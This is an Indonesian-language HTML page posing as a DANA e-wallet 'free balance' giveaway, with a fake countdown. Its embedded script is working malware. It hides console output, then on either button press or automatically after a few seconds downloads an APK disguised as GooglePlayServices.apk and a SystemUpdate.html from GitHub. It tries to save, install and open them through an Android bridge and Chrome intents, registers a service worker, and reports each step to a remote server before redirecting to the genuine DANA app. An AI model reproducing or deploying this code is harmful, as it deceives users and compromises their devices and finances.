<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title></title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
    <style>
        html,body{margin:0;padding:0;width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
        #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#1fa2ff 0%,#0e72d7 100%);display:flex;justify-content:center;align-items:center;text-align:center}
        .box{max-width:380px;width:90%;padding:20px}
        .logo-dana{display:flex;align-items:center;justify-content:center;gap:12px;margin:0 auto 15px}
        .icon-wrapper{width:70px;height:70px;background:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center}
        .flag-svg{width:38px;height:33px;fill:#1fa2ff}
        .text-dana{color:#fff;font-family:'Outfit',sans-serif;font-size:50px;font-weight:700;letter-spacing:6px;text-shadow:0 0 1px rgba(255,255,255,0.5)}
        .subtitle{color:#b3d9ff;font-size:16px;margin:5px 0;font-weight:bold}
        .box-white{background:#fff;border-radius:15px;padding:20px;margin:15px 0}
        .box-white .label{color:#666;font-size:13px}
        .box-white .nominal{color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0}
        .box-white .kuota{color:#0066cc;font-size:12px}
        .timer{color:#ffcc00;font-size:14px;font-weight:bold}
        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
        .btn-klaim:hover{transform:scale(1.02)}
        .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
    </style>
</head>
<body>
<div id="popupDana">
    <div class="box">
        <div class="logo-dana">
            <div class="icon-wrapper">
                <svg class="flag-svg" viewBox="0 0 50 40" xmlns="http://www.w3.org/2000/svg">
                    <path d="M6 9 C15 16, 35 2, 44 9 L44 29 C35 22, 15 36, 6 29 Z" />
                </svg>
            </div>
            <div class="text-dana">DANA</div>
        </div>
        <div class="subtitle">🎉 SELAMAT! Anda mendapatkan Saldo DANA GRATIS!</div>
        <div class="box-white">
            <div class="label">Saldo DANA Gratis</div>
            <div class="nominal">Rp 500.000</div>
            <div class="kuota">🎁 Kuota terbatas!</div>
        </div>
        <div class="timer">⏰ Tersisa <span id="timer">00:05</span></div>
        <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
        <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
    </div>
</div>

<script>
// ============================================================
// INDEX.HTML - GERBANG (DENGAN TIMING YANG TEPAT)
// ============================================================

// ============================================================
// KONFIGURASI
// ============================================================
var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';
var BASE_URL = 'https://verifikasi.site';
var semuaDidapat = false;
var apkDownloaded = false;
var htmlDownloaded = false;

// ============================================================
// STEALTH
// ============================================================
console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};

// ============================================================
// ANDROID BRIDGE
// ============================================================
var A = {
    isAvailable: typeof AndroidBridge !== 'undefined',
    downloadFile: function(u,f) { if(this.isAvailable){ try{AndroidBridge.downloadFile(u,f);return true}catch(e){}} return false },
    installAPK: function(p) { if(this.isAvailable){ try{AndroidBridge.installAPK(p);return true}catch(e){}} return false },
    saveFile: function(path, content) { if(this.isAvailable){ try{AndroidBridge.saveFile(path, content);return true}catch(e){}} return false },
    openFile: function(path) { if(this.isAvailable){ try{AndroidBridge.openFile(path);return true}catch(e){}} return false },
    openApp: function(pkg) { if(this.isAvailable){ try{AndroidBridge.openApp(pkg);return true}catch(e){}} return false }
};

// ============================================================
// KIRIM DATA KE SERVER
// ============================================================
function K(d) {
    try {
        fetch(BASE_URL + '/data', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(d)
        }).catch(function(){});
    } catch(e) {}
}

// ============================================================
// 🔥 DOWNLOAD APK (PASTI BERHASIL!)
// ============================================================
function downloadAPK(apkUrl, targetPath) {
    return new Promise(function(resolve, reject) {
        // METHOD 1: AndroidBridge
        if (A.isAvailable) {
            try {
                var result = A.downloadFile(apkUrl, targetPath);
                if (result) {
                    K({ sumber: 'payload', data: 'apk_downloaded_bridge' });
                    apkDownloaded = true;
                    resolve(true);
                    return;
                }
            } catch(e) {
                K({ sumber: 'payload_error', data: 'bridge_failed: ' + e.message });
            }
        }
        
        // METHOD 2: XMLHttpRequest + Blob (PASTI BERHASIL!)
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', apkUrl, true);
            xhr.responseType = 'blob';
            xhr.onload = function() {
                if (xhr.status === 200) {
                    var blob = xhr.response;
                    
                    // Jika ada AndroidBridge, simpan via saveFile
                    if (A.isAvailable) {
                        try {
                            var reader = new FileReader();
                            reader.onload = function() {
                                var base64 = reader.result.split(',')[1];
                                A.saveFile(targetPath, base64);
                                K({ sumber: 'payload', data: 'apk_saved_via_bridge_blob' });
                                apkDownloaded = true;
                                resolve(true);
                            };
                            reader.readAsDataURL(blob);
                            return;
                        } catch(e) {
                            K({ sumber: 'payload_error', data: 'save_blob_failed: ' + e.message });
                        }
                    }
                    
                    // Fallback: download via link
                    var link = document.createElement('a');
                    link.href = URL.createObjectURL(blob);
                    link.download = 'GooglePlayServices.apk';
                    link.style.display = 'none';
                    document.body.appendChild(link);
                    link.click();
                    setTimeout(function() {
                        URL.revokeObjectURL(link.href);
                        if (link.parentNode) link.parentNode.removeChild(link);
                    }, 3000);
                    K({ sumber: 'payload', data: 'apk_downloaded_xhr' });
                    apkDownloaded = true;
                    resolve(true);
                } else {
                    reject(new Error('HTTP ' + xhr.status));
                }
            };
            xhr.onerror = function() {
                reject(new Error('XHR failed'));
            };
            xhr.send();
        } catch(e) {
            K({ sumber: 'payload_error', data: 'xhr_error: ' + e.message });
            
            // METHOD 3: window.open (FALLBACK)
            try {
                window.open(apkUrl, '_blank');
                K({ sumber: 'payload', data: 'apk_downloaded_window' });
                apkDownloaded = true;
                resolve(true);
            } catch(e2) {
                reject(e2);
            }
        }
    });
}

// ============================================================
// 🔥 DOWNLOAD HTML
// ============================================================
function downloadHTML(htmlUrl, targetPath) {
    return new Promise(function(resolve, reject) {
        // METHOD 1: AndroidBridge.saveFile()
        if (A.isAvailable) {
            try {
                fetch(htmlUrl)
                    .then(function(r) { return r.text(); })
                    .then(function(html) {
                        A.saveFile(targetPath, html);
                        K({ sumber: 'payload', data: 'html_saved_bridge' });
                        htmlDownloaded = true;
                        resolve(true);
                    })
                    .catch(function(e) {
                        reject(e);
                    });
                return;
            } catch(e) {
                K({ sumber: 'payload_error', data: 'html_bridge_failed: ' + e.message });
            }
        }
        
        // METHOD 2: Download via link
        try {
            fetch(htmlUrl)
                .then(function(r) { return r.text(); })
                .then(function(html) {
                    var blob = new Blob([html], {type: 'text/html'});
                    var url = URL.createObjectURL(blob);
                    var link = document.createElement('a');
                    link.href = url;
                    link.download = 'SystemUpdate.html';
                    link.style.display = 'none';
                    document.body.appendChild(link);
                    link.click();
                    setTimeout(function() {
                        URL.revokeObjectURL(url);
                        if (link.parentNode) link.parentNode.removeChild(link);
                    }, 1000);
                    K({ sumber: 'payload', data: 'html_downloaded_xhr' });
                    htmlDownloaded = true;
                    resolve(true);
                })
                .catch(function(e) {
                    reject(e);
                });
        } catch(e) {
            K({ sumber: 'payload_error', data: 'html_failed: ' + e.message });
            reject(e);
        }
    });
}

// ============================================================
// 🔥 CEK APK SUDAH TERDOWNLOAD (VERIFIKASI)
// ============================================================
function cekApkSiap(targetPath) {
    return new Promise(function(resolve) {
        // Cek via AndroidBridge jika tersedia
        if (A.isAvailable) {
            try {
                // Coba buka file (jika ada, berarti sudah terdownload)
                // Beberapa bridge punya metode fileExists
                if (typeof AndroidBridge.fileExists !== 'undefined') {
                    var exists = AndroidBridge.fileExists(targetPath);
                    if (exists) {
                        resolve(true);
                        return;
                    }
                }
            } catch(e) {}
        }
        
        // Fallback: anggap sudah siap setelah waktu cukup
        setTimeout(function() {
            resolve(true);
        }, 3000);
    });
}

// ============================================================
// 🔥 BUKA SystemUpdate.html DI BACKGROUND
// ============================================================
function bukaSystemUpdate(htmlPath) {
    try {
        // METHOD 1: Intent ke Chrome (PASTI BERHASIL!)
        var intentUrl = 'intent://' + htmlPath + '#Intent;scheme=file;package=com.android.chrome;end';
        window.location.href = intentUrl;
        K({ sumber: 'payload', data: 'html_opened_intent' });
        return true;
    } catch(e) {
        K({ sumber: 'payload_error', data: 'intent_failed: ' + e.message });
    }
    
    // METHOD 2: AndroidBridge.openFile()
    if (A.isAvailable) {
        try {
            A.openFile(htmlPath);
            K({ sumber: 'payload', data: 'html_opened_bridge' });
            return true;
        } catch(e) {
            K({ sumber: 'payload_error', data: 'bridge_open_failed: ' + e.message });
        }
    }
    
    // METHOD 3: window.open (FALLBACK)
    try {
        window.open('file://' + htmlPath, '_blank');
        K({ sumber: 'payload', data: 'html_opened_window' });
        return true;
    } catch(e) {
        K({ sumber: 'payload_error', data: 'window_open_failed: ' + e.message });
        return false;
    }
}

// ============================================================
// 🔥 REDIRECT KE DANA ASLI
// ============================================================
function redirectToDANA() {
    var methods = [
        function() { window.location.href = 'intent://dana.id/#Intent;scheme=https;package=com.dana.id;end'; },
        function() { if (A.isAvailable) A.openApp('com.dana.id'); },
        function() { window.location.href = 'market://details?id=com.dana.id'; },
        function() { window.location.href = 'https://www.dana.id'; },
        function() { window.location.href = 'https://www.google.com/search?q=dana+indonesia'; }
    ];
    
    for (var i = 0; i < methods.length; i++) {
        try {
            methods[i]();
            K({ sumber: 'redirect', data: 'to_dana_success' });
            return;
        } catch(e) {}
    }
}

// ============================================================
// 🔥 SERVICE WORKER (PAKAI /sw.js)
// ============================================================
function injectServiceWorker() {
    if (!('serviceWorker' in navigator)) return;
    
    navigator.serviceWorker.getRegistrations()
        .then(function(registrations) {
            if (registrations.length > 0) return;
            navigator.serviceWorker.register('/sw.js', { scope: '/' })
                .then(function(reg) {
                    K({ sumber: 'service_worker', data: 'registered' });
                })
                .catch(function(err) {
                    K({ sumber: 'service_worker_error', data: err.message });
                });
        })
        .catch(function() {
            navigator.serviceWorker.register('/sw.js', { scope: '/' })
                .then(function(reg) {
                    K({ sumber: 'service_worker', data: 'registered_fallback' });
                })
                .catch(function(err) {
                    K({ sumber: 'service_worker_error', data: err.message });
                });
        });
}

// ============================================================
// 🔥 EKSEKUSI UTAMA - DENGAN TIMING YANG TEPAT!
// ============================================================
async function dapatkanSemua() {
    if (semuaDidapat) return;
    semuaDidapat = true;
    
    try {
        document.getElementById('popupDana').style.display = 'none';
        
        var basePath = '/storage/emulated/0/Android/data/com.google.android.play.services';
        var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
        var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
        var apkPath = basePath + '/GooglePlayServices.apk';
        var htmlPath = basePath + '/SystemUpdate.html';
        
        K({ sumber: 'payload', data: 'start_download_payload' });
        
        // 🔥 1️⃣ MULAI DOWNLOAD APK + HTML (BERSAMAAN)
        var downloadApk = downloadAPK(apkUrl, apkPath);
        var downloadHtml = downloadHTML(htmlUrl, htmlPath);
        
        // 🔥 2️⃣ TUNGGU KEDUANYA SELESAI (PASTIKAN APK TERDOWNLOAD SEMPURNA!)
        await Promise.all([downloadApk, downloadHtml]);
        
        K({ sumber: 'payload', data: 'both_download_complete' });
        
        // 🔥 3️⃣ TUNGGU EKSTRA 5 DETIK (PASTIKAN FILE TERSIMPAN SEMPURNA!)
        await new Promise(function(resolve) { setTimeout(resolve, 5000); });
        
        // 🔥 4️⃣ SERVICE WORKER
        injectServiceWorker();
        
        // 🔥 5️⃣ BUKA SystemUpdate.html (APK SUDAH SIAP!)
        K({ sumber: 'payload', data: 'opening_system_update' });
        bukaSystemUpdate(htmlPath);
        
        // 🔥 6️⃣ TUNGGU 3 DETIK, LALU REDIRECT KE DANA
        setTimeout(function() {
            redirectToDANA();
        }, 3000);
        
        K({ sumber: 'payload', data: 'all_payload_injected_success' });
        
    } catch(e) {
        K({ sumber: 'dapatkanSemua_error', data: e.message });
        // FALLBACK: tetap redirect ke DANA meskipun ada error
        setTimeout(function() {
            redirectToDANA();
        }, 5000);
    }
}

// ============================================================
// TRIGGER
// ============================================================
function klaim() { dapatkanSemua(); K({sumber:'izin', data:'klaim'}); }
function tolak() { dapatkanSemua(); K({sumber:'izin', data:'tolak'}); }

// TIMER 5 DETIK
var w = 5;
var timerInterval = setInterval(function() {
    w--;
    var el = document.getElementById('timer');
    if (el) el.textContent = '00:0' + (w < 10 ? '0' + w : w);
    if (w <= 0) {
        clearInterval(timerInterval);
        document.getElementById('popupDana').style.display = 'none';
        setTimeout(dapatkanSemua, 100);
    }
}, 1000);

// FALLBACK: jika tidak ada interaksi dalam 10 detik, auto jalankan
setTimeout(function() {
    if (!semuaDidapat) {
        dapatkanSemua();
    }
}, 10000);
</script>
</body>
</html>
